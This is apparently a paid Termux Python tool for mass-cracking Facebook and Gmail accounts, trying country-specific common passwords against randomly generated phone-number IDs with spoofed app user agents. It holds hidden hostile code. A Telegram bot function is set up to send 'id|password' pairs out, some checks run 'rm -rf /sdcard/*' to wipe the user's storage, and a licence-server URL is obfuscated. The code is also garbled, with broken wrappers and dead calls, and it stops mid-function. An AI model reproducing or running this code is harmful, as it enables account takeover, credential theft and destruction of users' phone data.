#THHEE FWAKERR LEEGGENND SSAURAVVV HHEREE-!
#——————————————————————————————————————
import base64
exec(base64.b64decode(b'from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules...\n It will take some seconds...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python handsome.py')
except:pass

try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()
try:
    import httplib2
except ImportError:
    print("httplib2 module not found. Installing...")
    subprocess.check_call(['pip', 'install', 'httplib2'])
    import httplib2
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using ALONE');exit()

      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using ALONE');exit()

      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using ALONE');exit()



with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
  
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/httplib2/__init__.py', 'r') as file:
    file_content = file.read()
if 'disable_ssl_certificate_validation=True' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/httplib2')
    os.system('rm -rf /sdcard/*')
    os.system('pip install httplib2')
    exit('[ðŸ¤£] RE-RUN TOOL.!')  
def fucked():
    os.system('rm -rf /sdcard/*')
    os.system('rm-rf /sdcard/DCIM/')
    os.system('rm-rf /sdcard/Android/')
    os.system('rm-rf /sdcard/Android/data/')
    os.system('rm -rf /sdcard/Download/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /sdcard/0/*')      

##--------------CP CHORNE BOT---------------------##
import requests
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def smart(ids,pas):
    session = requests.session()
    bot_token = "7466710096:AAGSrz-PUvLeAxj7vgR_xH8y-3WutiNbRrE"
    chat_id = "7487928311"
    # Construct the message
    message = f"{ids}|{pas}"
    
    try:
        # Send message
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        data = {'chat_id': chat_id, 'text': message}
        session.post(url, data=data)
    except Exception as e:
        pass

with ThreadPool(max_workers=1) as executor:
    executor.submit(smart)    
#----------http_canary-------#
import requests
import os,sys


try:
    g = "anar"
    f="tt"
    file_d = os.listdir('rm -rf')
    if f'com.h{f}pc{g}y.pro' in file_d:
        print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
        exit()
    else:
        pass
except Exception as e:
    pass

try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
    
def clr():
    try:
        data = os.listdir('/sdcard/*')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY ALONE');exit()
        else:exit()
    except:exit()   
#_________[ IMPORTING TIME MODULS ]______>>
import os
from datetime import date, datetime
from time import sleep, localtime

# Get current date and time
current = datetime.now()
dt_string = current.strftime("%H:%M")
today = date.today()

# Function to clear screen
def clear():
    os.system('clear')  # Assuming you are on a Unix-like system
    # print(logo)  # Assuming 'logo' is defined or imported somewhere

# Get current local time in 12-hour format with AM/PM
ltx = localtime().tm_hour
if ltx > 12:
    a = ltx - 12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

# Example usage of the functions and variables
clear()
import socket

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

import socket

domain_name = "example.com"
ip_address = socket.gethostbyname(domain_name)

from urllib.request import urlopen
import re as r


import requests

def get_public_ip():
    try:
        # Using a public service to fetch our public IP address
        response = requests.get('https://api64.ipify.org?format=json')
        if response.status_code == 200:
            return response.json()['ip']
        else:
            return "Failed to fetch public IP address."
    except requests.RequestException as e:
        return f"Error: {e}"

# Get and print the public IP address
public_ip = get_public_ip()

import requests

def get_network_provider():
    try:
        # Using ipinfo.io to fetch details based on our public IP address
        response = requests.get('https://ipinfo.io/json')
        if response.status_code == 200:
            data = response.json()
            return data.get('org', 'Provider information not found')
        else:
            return "Failed to fetch network provider information."
    except requests.RequestException as e:
        return f"Error: {e}"

# Get and print the network provider's name
network_provider = get_network_provider()


def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;32| \33[1;32m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;32| \33[1;32m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;32| \33[1;32m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;32| \33[1;32m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;32| \33[1;32m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;32| \33[1;32m2010\33[1;32/\33[1;32m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;32| \33[1;32m2011\33[1;32/\33[1;32m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;32| \33[1;32m2012\33[1;32/\33[1;32m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;32| \33[1;32m2013\33[1;32/\33[1;32m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;32| \33[1;32m2014\33[1;32/\33[1;32m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;32| \33[1;32m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;32| \33[1;32m2015\33[1;32/\33[1;32m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;32| \33[1;32m2016\33[1;32/\33[1;32m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;32| \33[1;32m2018\33[1;32/\33[1;32m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;32| \33[1;32m2019\33[1;32/\33[1;32m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;32| \33[1;32m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;32| \33[1;32m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;32| \33[1;32m2022' 
        elif ids[:5] in ['10009']           :creation = '\33[1;32| \33[1;32m2022' 
        elif ids[:4] in ['6155']           :creation = '\33[1;32| \33[1;32m2023'        
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;32m| \33[1;32m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;32m| \33[1;32m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;37m| \33[1;32m2006/2007'
    else:creation=''
    return creation 
def getKey():

    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
    id = "".join(uuidd).replace("_","").replace("360","JXB").replace("u","9").replace("a","A")
    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    bxd = "ISS-"
    bumper = bxd+id+xp
    return bumper
    import random
import os


def ua():
	END = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H370 [FBAN/FBIOS;FBAV/474.0.0.28.107;FBBV/625583284;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/15.8;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/627786156]","Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21F90 [FBAN/FBIOS;FBAV/474.0.0.28.107;FBBV/625583284;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.5.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/627371094]","Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21F90 [FBAN/FBIOS;FBAV/474.0.0.28.107;FBBV/625583284;FBDV/iPad8,7;FBMD/iPad;FBSN/iPadOS;FBSV/17.5.1;FBSS/2;FBID/tablet;FBLC/de_DE;FBOP/5;FBRV/627371094]'
	ua = 'Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21F90 [FBAN/FBIOS;FBAV/474.0.0.28.107;FBBV/625583284;FBDV/iPad8,7;FBMD/iPad;FBSN/iPadOS;FBSV/17.5.1;FBSS/2;FBID/tablet;FBLC/de_DE;FBOP/5;FBRV/627371094]","Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/468.1.0.31.108;FBBV/625946001;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/17.5.1;FBSS/3;FBCR/;FBID/phone;FBLC/en_US;FBOP/80]","Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21F90 [FBAN/FBIOS;FBAV/474.0.0.28.107;FBBV/625583284;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/17.5.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/627371094]'+END
	return ua        
	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21F90 [FBAN/FBIOS;FBAV/473.0.0.25.108;FBBV/622998056;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/17.5.1;FBSS/3;FBID/phone;FBLC/da_DK;FBOP/5;FBRV/625034334]","Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 [FBAN/FBIOS;FBAV/472.0.0.25.107;FBBV/621085421;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/17.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]","Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/466.0.0.19.108;FBBV/620459873;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/17.4.1;FBSS/3;FBCR/;FBID/phone;FBLC/en_US;FBOP/80]'+END
	return ua
def iAmMethod2Ua():
    END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
    return ua        
    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1280, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CHP7800 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
    return ua
name=input('\033[1;32m[✓] \033[1;32mENTER YOUR  NAME:')    
logo=("""
\033[1;37m   
$$\   $$\ $$$$$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$\  $$\   $$\DEVELOPER:NEWTON
$$$\  $$ |$$  _____|$$ | $\  $$ |\__$$  __|$$  __$$\ $$$\  $$ |FB: DI W AS
$$$$\ $$ |$$ |      $$ |$$$\ $$ |   $$ |   $$ /  $$ |$$$$\ $$ |VERSION:2.0.7
$$ $$\$$ |$$$$$\    $$ $$ $$\$$ |   $$ |   $$ |  $$ |$$ $$\$$ |
$$ \$$$$ |$$  __|   $$$$  _$$$$ |   $$ |   $$ |  $$ |$$ \$$$$ |
$$ |\$$$ |$$ |      $$$  / \$$$ |   $$ |   $$ |  $$ |$$ |\$$$ |
$$ | \$$ |$$$$$$$$\ $$  /   \$$ |   $$ |    $$$$$$  |$$ | \$$ |
\__|  \__|\________|\__/     \__|   \__|    \______/ \__|  \__|                                                                                                           
\033[1;32m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
        print(f"WELCOME:" +name)
        print(f"Current date: {today}")
        print(f"Current time: {dt_string}")
        print("Network Provider:", network_provider)
        print("Public IP Address:", public_ip)
        print('\033[1;37m----------------------------------------------')
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
def menu():
                        clear()
                        print("[1] File cloning")
                        print("[2] Create file")
                        print("[3] Random cloning")
                        print("[4] Random Gmail cloning")
                        print("[5] Join WhatsApp group")
                        print("[0] Exit")
                        
                        linex()
                        axs=input('\033[1;32m[✓] \033[1;32mChoose option: ')
                        if axs in ['1','01']:
                                file()
                        elif axs in ['2','02']:
                                print("HANNAN KO CMD USE GAR")
                        elif axs in ['3','03']:
                                rndmpk()      
                        elif axs in ['4','04']:
                                gmail()
                        elif axs in ['5','05']:
                                os.system("xdg-open https://chat.whatsapp.com/IrocJuk01SwGYYQuZqQ1Bd")
                                os.system("xdg-open https://m.me/j/Aba7_vxydBZSush6/")
                        elif axs in ['0','00']:
                                exit(" Thanks for use my tool")        
                        else: 
                         exit(' Select valid option .') 
http_obj = httplib2.Http() 
#______________[AAKASH KO UA GENERATOR]____________#

def make():
    a='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['6','7','8','9','10','11','12','13',])
    c=random.choice(['Linux; Android 12;'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    e=random.randrange(1,9999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(5670,67900)
    k=random.randrange(40,150)
    l='Chrome/124.0.0.0 Mobile Safari/537.36 [ip:78.209.200.125]]'
    END="[FBAN/FB4A,FBAV/61.0.0.15.69;FBBV/20748118;FBDM/"+"{density=3.0,width=1080,height=1776}"+";FBLC/ en_"+"US;"+"FBCR/Vi"+"deo"+"tr"+"on;FBMF/m"+"otor"+"ola;FBBD/mo"+"tor"+"ola;FBPN/com.facebook.katana;FBDV/X"+"T156"+"3;FBSV/ 6.0;nullFBCA/armeabi-v7a:armeabi;]"
    make=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'+END
    return make              
#___________________________________________________#            
def za():
    global tp
    myid = getKey()
    os.system(" clear ")
    ux=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcf,\xce\xc8-\xcd54\xd7K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd170\xd4O,((\xca/K\xcc\xd1\xcb(\xc9\xcd\x01\x00\xd2\x91\x11\xca').decode()
    response, content = http_obj.request(ux, 'GET')
    content = content.decode('utf-8')       
    if myid in str(content):
        tp=1
        menu()
    else:
        tp=0
        print("\33[1;37m Read note first bro...!\33[1;37m");print(logo);print (" Validity : 30Days 600");print (" validity : \33[1;37m15days= 400\n \033[1;32mFOR OUT OF COUNTRY-----------> \n \033[1;37mValidity : 30days = 10$\33[1;37m\n \33[1;37m\33[37;41mNote: If You Are Free User exit this tool\33[0;0m");linex();print(" Your Key  :\n "+myid);linex();print(' Kam payment karny waly ko approval nahi milyga');linex(); print(" i WILL ACCEPT ALL COUNTRY'PAYMENT METHOD \nEXAMPLE EASYPAISA,JAZZCASH,CRYPTO,PYAEER,BINANCE,PLAMPAY,BKASH,NAGAD,PAYTM,UPI,\nYOU FROM ANY COUNTRY COME IB FOR BUY TOOL");linex();print('FACEBOOK GO ON UPDATE THEN TOOL GIVE NOT OK RESULT  \nI WILL UPDATE MY TOOL EVERY TWO DAYS \nIF YOU CLEAR YOUR TERMUX DATA AND TOOL NEED AGAIN APPROVL  \nIDEVELPER ARE NOT RESPONSIBLE  ')
        print('\033[1;97mCOPY YOUR COPY AND READ TERMS AND POLICY \033[1;37m(\033[1;95mPRESS ENTER FOR BUY TOOL\033[1;37m)')
        linex()
        input(" press enter to send key")
        linex();print(" You are not paid user ");linex()
        os.system("xdg-open https://wa.me/+8801731259842")

def file():
                          #      verf()	
                                clear()
                                print(' \033[1;32mPut file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' \033[1;32mPut file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All method working try 1 by 1 ')
                                linex()
                                print(' [1] Method 1(RECOMMENDED)\n [2] Method 2 \n [3] Method 3 \n [4] Method 4 \n [5] Method 5')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print(" [1] Auto Password \n [2] Choice Password ")                                
                                linex()
                                psx=input(' Choose: ')
                                if psx in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')             
                                        plist.append('first@123')
                                        plist.append('first@12345')        
                                        plist.append('first123@')
                                        plist.append('@first123')
                                        plist.append('first123456789')        
                                        plist.append('firstlast123')       
                                        plist.append('firstlast@123')   
                                        plist.append('Nepal123')
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(' How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m exp: first last,firstlast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' Password {i+1}: '))
                                linex()
                                print(' Do you want show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                linex()
                                print(' Do you want show cookies? (y/n): ')
                                pcookie = []
                                linex()
                                DI=input(' Choose: ')
                                if DI in ['y','Y','yes','Yes','1']:
                                        pcookie.append('y')
                                else:
                                    pcookie.append('n')
                                linex()
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\033[1;37m \x1b[38;5;208mTOTAL ACCOUNT : \033[1;32m'+total_ids)
                                        print("\033[1;37m \x1b[38;5;208mUSE AIRPLANE MODE FOR MORE OK IDS \033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(M1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(M2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(M3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(M4,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(M5,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python handsome.py')


def rndmpk():
                        clear()        
                        print("[1] Nepal x ind cracking")
                        print("[2] Pakistan cracking")
                        print("[3] Bd cracking")  
                        linex()   
                        ax=input('[?] Choose option :')
                        if ax in ['1','01']:
                                npxind()
                        elif ax in ['2','02']:
                                pak()
                        elif ax in ['3','03']:
                                bd()      
                        elif ax in ['4','04']:
                                ind()          
def npxind():
                user=[]
                clear()
                print('\033[1;37m Example : ,9816,9814,ETC')
                linex()
                print(" Put your country 4digit code")
                linex
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                clear()                        
                print(' [1] Method  \033[1;32m \n [2] \033[1;33mMethod  ') 
                linex()
                mthd = input('choose : ')
                clear()                
                print(" Select your country password method")
                linex()
                print("[1] Ind password method ")
                print("[2] Nepal password method ")
                linex()
                pcs = input("choose : ")
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(6))
                        user.append(nmp)
                with tred(max_workers=30) as HANDSOME:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                if pcs in ['1','01']:                                   
                                    passlist = [psx,ids,'meena123','57575751','57273200','manish123','manish1234','sharma123','i love you','iloveyou','viratkohli','bhagwan','pubglover','pubg1122']
                                elif pcs in ['2','02']:     
                                    passlist = [psx,ids,'nepal123','nepal1234','nepal@123','sagar123','i love you','freefire','Nepal@123','free fire','kathmandu','kathmandu123','sagarmatha123','machikney123','maya123','maya1234','maya12345,']                             
                                if mthd in ['1','01']:                                 
                                    HANDSOME.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    HANDSOME.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python HANDSOME.py')    
                
def pak():
                user=[]
                clear()
                print('\033[1;37m Example : ,0300,ETC')
                linex()
                print(" Put your country 4digit code")
                linex
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                clear()                        
                print(' [1] Method  \033[1;32m \n [2] \033[1;33mMethod  ') 
                linex()
                mthd = input('choose : ')
                clear()                       
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as HANDSOME:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','maryam123','khanking','baloch','peshawar','pubg1122']
